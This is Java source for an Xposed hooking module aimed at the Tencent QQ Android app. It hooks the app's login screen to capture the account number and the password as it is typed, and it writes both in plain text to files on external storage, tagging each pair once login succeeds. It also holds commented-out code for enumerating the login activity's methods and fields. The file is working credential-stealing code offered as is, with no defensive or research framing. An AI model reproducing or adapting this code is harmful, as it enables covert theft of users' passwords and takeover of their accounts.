package com.dhb.qqhook.hooks;

import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
import static de.robv.android.xposed.XposedHelpers.findClass;

import android.os.Environment;
import android.text.Editable;
import android.util.Log;

import com.dhb.qqhook.Common;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

/**
 * Created by DHB on 2015/12/17.
 */
public class Qq {

    private static final String LOGIN_ACTIVITY = "com.tencent.mobileqq.activity.LoginActivity";
    private static final String LOGIN_ACTIVITY_METHOD_AFTERTEXTCHANGED = "afterTextChanged";
    private static final String LOGIN_ACTIVITY_METHOD_C = "c";
    private static final String LOGIN_ACTIVITY_METHOD_A = "a";
//    private static final String SecMsgPluginProxyActivity = "com.tencent.mobileqq.cooperation.secmsg.SecMsgPluginProxyActivity";

    public static void handleLoadPackage(XC_LoadPackage.LoadPackageParam param) {
        if (!param.packageName.equals("com.tencent.mobileqq")) {
            return;
        }

        getQQ(param);
        getKey(param);
        check(param);

//        readAllMethod(param);
//        readAllField(param);
//        readAllMethod(param,SecMsgPluginProxyActivity);
//        readAllField(param,SecMsgPluginProxyActivity);


//        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader, "a", String.class, boolean.class, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                super.beforeHookedMethod(param);
//                XposedBridge.log("QQ Hook a(String.class, boolean.class): " + param.args[0].toString());
//            }
//        });
//
//        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader, "b", String.class, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                super.beforeHookedMethod(param);
//                XposedBridge.log("QQ Hook b(java.lang.String): "+param.args[0].toString());
//            }
//        });


//        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader, "a", "QQAppInterface",String.class, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                super.beforeHookedMethod(param);
//                XposedBridge.log("QQ Hook a(QQAppInterface,String.class): "+param.args[0].toString());
//            }
//        });

//        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader, "c", String.class, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                super.beforeHookedMethod(param);
//                XposedBridge.log("QQ Hook c(java.lang.String): "+param.args[0].toString());
//            }
//        });
//
//        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader, "d", String.class, new XC_MethodHook() {
//            @Override
//            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                super.beforeHookedMethod(param);
//                XposedBridge.log("QQ Hook d(java.lang.String): "+param.args[0].toString());
//            }
//        });
    }


    /**
     * 获取qq号码
     *
     * @param param
     */
    private static void getQQ(XC_LoadPackage.LoadPackageParam param) {
        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader,
                LOGIN_ACTIVITY_METHOD_A, String.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        File f = new File(Common.DIRECTORY_PATH);
                        if (!f.exists()) {
                            f.mkdirs();
                        }
                        File file = new File(Common.QQ_PATH_TEMP_FILE);
                        FileWriter writer = new FileWriter(file);
                        writer.write("QQ:" + param.args[0].toString().trim());
                        XposedBridge.log("QQ:" + param.args[0].toString());
                        XposedBridge.log(Environment.getExternalStorageDirectory().getPath());
//                        android.util.Log.d("QQ",param.args[0].toString());
                        writer.flush();
                        writer.close();
                    }
                });
    }

    /**
     * 获取QQ密码
     *
     * @param param
     */
    private static void getKey(XC_LoadPackage.LoadPackageParam param) {
        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader,
                LOGIN_ACTIVITY_METHOD_AFTERTEXTCHANGED, Editable.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(XC_MethodHook.MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
                        File f = new File(Common.DIRECTORY_PATH);
                        if (!f.exists()) {
                            f.mkdirs();
                        }
                        File file = new File(Common.QQ_KEY_PATH_TEMP_FILE);
                        FileWriter writer = new FileWriter(file);
                        writer.write("密码:" + param.args[0].toString());
                        XposedBridge.log("KEY:" + param.args[0].toString());
//                        android.util.Log.d("QQKEY",param.args[0].toString());
                        writer.flush();
                        writer.close();
                    }
                });
    }


    private static void check(XC_LoadPackage.LoadPackageParam param) {
        findAndHookMethod(LOGIN_ACTIVITY, param.classLoader,
                LOGIN_ACTIVITY_METHOD_C, String.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        super.afterHookedMethod(param);
//                        XposedBridge.log(":check");
                        File f = new File(Common.DIRECTORY_PATH);
                        if (!f.exists()) {
                            f.mkdirs();
                        }

                        File qqFile = new File(Common.QQ_PATH_TEMP_FILE);
                        File qqKeyFile = new File(Common.QQ_KEY_PATH_TEMP_FILE);

                        if (qqFile.exists() && qqKeyFile.exists()) {

                            File file = new File(Common.path);
                            String qq = "";
                            String qqkey = "";
                            String qqTemp;
                            FileWriter writer = new FileWriter(file, true);
                            XposedBridge.log("check:" + param.args[0].toString());

                            BufferedReader qqReader = new BufferedReader(new FileReader(qqFile));
                            BufferedReader qqKeyReader = new BufferedReader(new FileReader(qqKeyFile));
                            while ((qqTemp = qqReader.readLine()) != null) {
                                qq = qqTemp;
                            }
                            while ((qqTemp = qqKeyReader.readLine()) != null) {
                                qqkey = qqTemp;
                            }

                            writer.write("##########\n" + qq + "\n" + qqkey + "\n" + "密码验证成功！\n" + "###########\n");
                            writer.flush();
                            writer.close();
                            Log.d("qq", "密码验证成功");
                            qqFile.delete();
                            qqKeyFile.delete();
                        }
                    }
                });
    }


//    /**
//     * 读取所有方法
//     */
//    private static void readAllMethod(XC_LoadPackage.LoadPackageParam param) {
//        Class<?> LoginActivity = findClass(LOGIN_ACTIVITY, param.classLoader);
//        Method[] methods = LoginActivity.getDeclaredMethods();
//        for (Method method :
//                methods) {
//            XposedBridge.log("QQ Hook " + method.toGenericString());
//        }
//    }
//
//    private static void readAllMethod(XC_LoadPackage.LoadPackageParam param, String packageName) {
//        Class<?> LoginActivity = findClass(packageName, param.classLoader);
//        Method[] methods = LoginActivity.getDeclaredMethods();
//        for (Method method :
//                methods) {
//            XposedBridge.log("QQ Hook " + method.toGenericString());
//        }
//    }
//
//    private static void readAllField(XC_LoadPackage.LoadPackageParam param) {
//        Class<?> LoginActivity = findClass(LOGIN_ACTIVITY, param.classLoader);
//        Field[] fields = LoginActivity.getDeclaredFields();
//        for (Field field :
//                fields) {
//            XposedBridge.log("QQ Hook " + field.toGenericString());
//        }
//    }
//
//    private static void readAllField(XC_LoadPackage.LoadPackageParam param, String packageName) {
//        Class<?> LoginActivity = findClass(packageName, param.classLoader);
//        Field[] fields = LoginActivity.getDeclaredFields();
//        for (Field field :
//                fields) {
//            XposedBridge.log("QQ Hook " + field.toGenericString());
//        }
//    }

}
